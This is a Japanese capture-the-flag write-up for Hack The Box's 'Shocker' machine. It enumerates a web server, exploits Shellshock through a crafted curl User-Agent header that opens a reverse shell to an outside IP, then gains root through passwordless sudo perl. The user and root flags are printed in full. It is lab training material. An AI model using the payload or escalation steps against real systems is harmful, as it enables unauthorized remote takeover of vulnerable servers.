https://app.hackthebox.com/machines/Shocker
## STEP 1
```sh
└─$ rustscan -a 10.129.7.104 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
I scanned my computer so many times, it thinks we're dating.

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.7.104:80
Open 10.129.7.104:2222
10.129.7.104 -> [80,2222]
```


## STEP 2
80番にアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Shocker_01.png">  
列挙
```sh
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.7.104/FUZZ             

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.7.104/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 343ms]
.htaccess               [Status: 403, Size: 294, Words: 22, Lines: 12, Duration: 343ms]
.hta                    [Status: 403, Size: 289, Words: 22, Lines: 12, Duration: 369ms]
cgi-bin/                [Status: 403, Size: 293, Words: 22, Lines: 12, Duration: 306ms]
index.html              [Status: 200, Size: 137, Words: 9, Lines: 10, Duration: 290ms]
server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 294ms]
:: Progress: [4744/4744] :: Job [1/1] :: 138 req/sec :: Duration: [0:00:36] :: Errors: 0 ::
```
`cgi-bin`にはアクセス拒否されているが、配下のスクリプトにアクセス可能なものがあるかもしれないので列挙  
`user.sh`がアクセス可能であった
```sh
└─$  ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://10.129.7.104/cgi-bin/FUZZ -e .sh

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.7.104/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Extensions       : .sh 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 300, Words: 22, Lines: 12, Duration: 293ms]
.hta.sh                 [Status: 403, Size: 303, Words: 22, Lines: 12, Duration: 299ms]
.htaccess.sh            [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 302ms]
.htaccess               [Status: 403, Size: 305, Words: 22, Lines: 12, Duration: 302ms]
.htpasswd.sh            [Status: 403, Size: 308, Words: 22, Lines: 12, Duration: 302ms]
.htpasswd               [Status: 403, Size: 305, Words: 22, Lines: 12, Duration: 302ms]
user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8, Duration: 291ms]
:: Progress: [9492/9492] :: Job [1/1] :: 145 req/sec :: Duration: [0:01:21] :: Errors: 0 ::
```
`user.sh`にアクセスすると、`uptime`コマンドが実行されるスクリプトが動作しているっぽい
```sh
└─$ curl http://10.129.7.104/cgi-bin/user.sh          
Content-Type: text/plain

Just an uptime test script

 05:51:45 up  3:17,  0 users,  load average: 0.00, 0.00, 0.00

└─$ curl http://10.129.7.104/cgi-bin/user.sh
Content-Type: text/plain

Just an uptime test script

 05:51:51 up  3:17,  0 users,  load average: 0.00, 0.00, 0.00
```
cgi-binのスクリプトからコマンド実行されているが、もしかしたら`ShellShock`という脆弱性を用いたRCEができるかも  
nmapでShellShockの存在を確認できた
```sh
└─$ nmap -n -Pn -p80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh 10.129.7.104 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-30 06:04 EDT
Nmap scan report for 10.129.7.104
Host is up (0.31s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10

Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds
```


## STEP 3
STEP2のnmapスクリプトでもRCEできるが、シンプルに細工したヘッダをcurlで送りRCEできる  
```sh
└─$ curl -A "() { :;}; /bin/bash -i >& /dev/tcp/10.10.14.70/4444 0>&1" http://10.129.7.104/cgi-bin/user.sh
^C
```
リバースシェル取得  
ユーザフラグゲット！ルートフラグは権限拒否
```sh
└─$ rlwrap nc -lnvp 4444                                      
listening on [any] 4444 ...
connect to [10.10.14.70] from (UNKNOWN) [10.129.7.104] 36834
bash: no job control in this shell

shelly@Shocker:/usr/lib/cgi-bin$ tty
tty
not a tty

shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
cat /home/shelly/user.txt
20e038c019b7e9cc456d1666e4ad268e

shelly@Shocker:/usr/lib/cgi-bin$ ls /root
ls /root
ls: cannot open directory '/root': Permission denied
```


## STEP 4
sudoの設定不備を確認  
パスワードなしでroot権限でperlを実行できるらしい
```sh
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l                                                                                                                                           
Matching Defaults entries for shelly on Shocker:                                                                                                                                                                                            
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
perlでBashを起動、権限昇格成功！  
ルートフラグゲット
```sh
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'exec "/bin/bash";'
sudo perl -e 'exec "/bin/bash";'
id
uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
1f0314767289e73d6a1fcc13681752a5
```
